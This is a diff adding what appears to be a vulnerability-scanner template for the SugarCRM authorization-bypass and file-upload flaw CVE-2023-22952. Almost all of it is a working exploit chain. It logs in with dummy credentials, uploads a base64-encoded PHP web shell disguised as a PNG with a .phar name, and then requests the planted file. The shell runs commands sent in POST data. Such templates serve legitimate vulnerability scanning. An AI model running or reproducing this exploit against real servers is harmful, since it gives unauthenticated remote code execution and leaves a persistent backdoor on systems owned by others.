@@ -1,0 +1,77 @@
+id: sugarcrm-indexphp-fileupload
+info:
+  name: SugarCRM index.php File Upload Vulnerability (CVE-2023-22952)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    SugarCRM has a security vulnerability stemming from an authorization bypass and PHP local file inclusion vulnerability in the installation component. This can allow unauthenticated remote code execution using crafted HTTP requests.
+  tags: file-upload, rce, sugarcrm
+  reference:
+    - https://packetstormsecurity.com/files/170346/SugarCRM-Shell-Upload.html
+  classification:
+    cve-id: CVE-2023-22952
+    cvss-score: 9.8
+
+variables:
+  boundary: "73e4fcb8063f1adbcb747dc20f0e2e82"
+  webshell: "{{base64_decode('iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAMAAABPqWaPAAAAS1BMVEU8P3BocCBlY2hvICIjIyMjIyI7IHBhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJjIl0pKTsgZWNobyAiIyMjIyMiOyA/PiD2GHg3AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAKklEQVQokWNgwA0YmZhZWNnYOTi5uHl4+fgFBIWERUTFxCXwaBkFQxQAADC+AS1MHloSAAAAAElFTkSuQmCC')}}"
+  rand_name: "{{to_lower(rand_base(5))}}"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: login-auth
+    raw:
+      - |
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        module=Users&action=Authenticate&user_name=1&user_password=1
+    extractors:
+      - type: kval
+        internal: true
+        kval:
+          - Set-Cookie
+    matchers:
+      - type: status
+        status: [200]
+
+  - id: upload-webshell
+    raw:
+      - |
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{Set-Cookie}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="module"
+
+        EmailTemplates
+        --{{boundary}}
+        Content-Disposition: form-data; name="action"
+
+        AttachFiles
+        --{{boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{rand_name}}.phar"
+        Content-Type: image/png
+
+        {{webshell}}
+        --{{boundary}}--
+    matchers:
+      - type: status
+        status: [200]
+
+  - id: trigger-webshell
+    raw:
+      - |
+        GET /cache/images/{{rand_name}}.phar HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "#####"
+          - "uid="
